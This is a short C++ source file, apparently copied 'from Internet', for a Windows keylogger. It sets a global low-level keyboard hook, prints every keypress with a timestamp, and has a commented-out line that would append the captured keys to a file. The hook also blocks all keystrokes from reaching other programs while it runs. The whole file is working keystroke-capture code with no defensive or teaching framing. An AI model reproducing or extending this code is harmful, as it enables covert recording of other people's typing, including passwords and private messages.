/*
* From Internet
*/

#include <Windows.h>
#include<cstdio>
//#include<cstring>
SYSTEMTIME systime;
LRESULT CALLBACK Proc(int code, WPARAM w, LPARAM l) {
	KBDLLHOOKSTRUCT* T = (KBDLLHOOKSTRUCT*)l;
	DWORD x = T->vkCode;
	if (w == WM_KEYDOWN) {
		GetLocalTime(&systime);
		printf("Tip->%d/%d/%d %d:%d:%d", systime.wYear
			, systime.wMonth
			, systime.wDay
			, systime.wHour
			, systime.wMinute
			, systime.wSecond);
		printf("   Press:  ");
		putchar(x);
		putchar('\n');
	}
	return 1;// CallNextHookEx(NULL, code, w, l);
}
int main() {
	//freopen("Date.in","a+",stdout);
	HHOOK hook = ::SetWindowsHookEx(WH_KEYBOARD_LL, Proc, 0, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
	return 0;
}